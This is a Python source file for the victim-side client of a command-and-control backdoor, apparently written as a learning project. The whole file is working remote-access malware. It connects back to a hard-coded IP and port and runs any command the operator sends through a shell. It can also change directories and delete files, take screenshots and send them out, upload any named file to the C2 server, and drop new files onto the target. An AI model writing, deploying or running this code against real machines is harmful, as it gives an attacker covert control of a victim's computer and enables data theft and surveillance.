#!/usr/bin/python3

import socket
import subprocess            # libray which enables us to use trgt OS command in C2 server
import os                    # library can be used to change directory by the C2 server owner, after getting a shell back from trgt

import json                  # The process of encoding JSON is usually called serialization.
			     # This term refers to the transformation of data into a series of bytes
			     # (hence serial) to be stored or transmitted across a network


import PIL.ImageGrab         # python library for taking screenshot


# Sending whole data all at once
def recv_eff():

	data = ''

	while True:
		try:
			data = data + sock.recv(1024).decode('utf-8').rstrip()        # decoding data and striping out EOL spacing

			return json.loads(data)

		except ValueError:
			continue

# Receiving whole data all at once
def send_eff(data):

	json_data = json.dumps(data)
	sock.send(json_data.encode('utf-8'))                # encoding data to bytes


# For downloading files
def download_file(file_name):

	file = open(file_name, 'wb')

	sock.settimeout(1)

	# if all file datas are sent and nothing left for download,
	# the socket will keep on listening, but will not receive
	# anything, so if now it hangs(keeps on listening) for 1 sec,
	# while loop will break --> indicating file data transfer is
	# complete.

	data_small = sock.recv(1024)

	while data_small:

		file.write(data_small)

		try:
			data_small = sock.recv(1024)

		except socket.timeout:

			break

	sock.settimeout(None)
	file.close()


# For uploading files
def upload_file(file_name):

	file = open(file_name, 'rb')

	sock.send(file.read())


# Screenshot function
def screenshot():

	img = PIL.ImageGrab.grab()

	img.save(r'scrn_sht.png')


# Offering a shell from trgt
def shell():

	global cmd               # declaring global variable

	while True:
		cmd = recv_eff() # received response

		# shell command features

		if cmd == "exit": # ✓
			break

		elif cmd == "help": # ✓
			pass

		elif (cmd == "cls") or (cmd == "clear"): # ✓
			pass

		# Changing directory ✓
		elif cmd[:2] == "cd" and len(cmd) > 1:

			try:
				os.chdir(cmd[3:])        # we know that after changing direc nothing is shown in terminal/cmd,
						         # so we have to send nothing back to C2 Server

			except:
				continue

		# Removing file path in linux ✓
		elif cmd[:2] == "rm" and len(cmd) > 1:

			try:
				os.remove(cmd[3:])       # remove specified file path

			except:
				continue                 # we know that after removing path nothing is shown in terminal/cmd,
							 # so we have to receive nothing as data from trgt

		# Removing file path in Win ✓
		elif cmd[:3] == "del" and len(cmd) > 1:

			try:
				os.remove(cmd[4:])       # remove specified file path

			except:
				continue                 # we know that after removing path nothing is shown in terminal/cmd,
							 # so we have to receive nothing as data from trgt


		# Screenshot ✓
		elif (cmd[:10] == "screenshot" and len(cmd) > 1 ) or (cmd[:2] == 'ss' and len(cmd) > 1 ):

			screenshot()                     # Taking screenshot

			upload_file('scrn_sht.png')      # sending the ss to C2

			os.remove('scrn_sht.png')        # removing the ss from trgt


		# Exfiltration in trgt point of view ✓
		elif cmd[:4] == "take" and len(cmd) > 1:

			upload_file(cmd[5:])

		# Infiltration in trgt point of view ✓
		elif cmd[:4] == "drop" and len(cmd) > 1:

			download_file(cmd[5:])

		else:
			# To enable trgt machine's cmd/bash command to run in C2
			proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

			result = proc.stdout.read() + proc.stderr.read()        # to show output as well as error to the screen in response to the sent command
			result = result.decode('utf-8')                         # decoding result that we got
			send_eff(result)                                        # getting output on the terminal


# creating socket object
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


# Connecting with the trgt
sock.connect(("192.168.0.105",1234))                                            # change the ip and port



def main():
	shell()

if __name__ == '__main__':
	main()

